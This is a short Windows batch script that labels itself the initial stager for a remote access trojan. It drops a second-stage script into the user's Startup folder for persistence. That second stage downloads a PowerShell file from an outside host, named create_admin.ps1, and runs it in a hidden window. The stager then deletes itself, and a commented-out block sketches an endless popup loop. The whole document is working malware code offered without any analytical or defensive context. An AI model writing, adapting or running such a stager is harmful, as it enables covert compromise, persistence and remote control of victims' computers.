@echo off

@REM initial stager for RAT

@REM Variables
set "STARTUP_PATH=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
set "INITIAL_PATH=%cd%"
set "THIS_FILE_NAME=initial.cmd"

@REM change the dir
cd %STARTUP_PATH%

@REM write pyloads to startup
(   @REM write here needed link for the download the create_admin.ps1
    echo powershell -c "Invoke-WebRequest -Uri 'ipv4.download.thinkbroadband.com/5MB.zip' -OutFile '%STARTUP_PATH%/create_admin.ps1'"
    echo powershell -WindowStyle hidden "%STARTUP_PATH%/create_admin.ps1"
)> stage2.cmd

@REM run a payload
powershell -WindowStyle hidden "./stage2.cmd"

@REM go back and delete ourselves
cd %INITIAL_PATH%
del %THIS_FILE_NAME%

@REM (
@REM     echo @echo off
@REM     echo :loop
@REM     echo start /min cmd /c "popup.vbs"
@REM     echo goto loop
@REM ) > payload.cmd
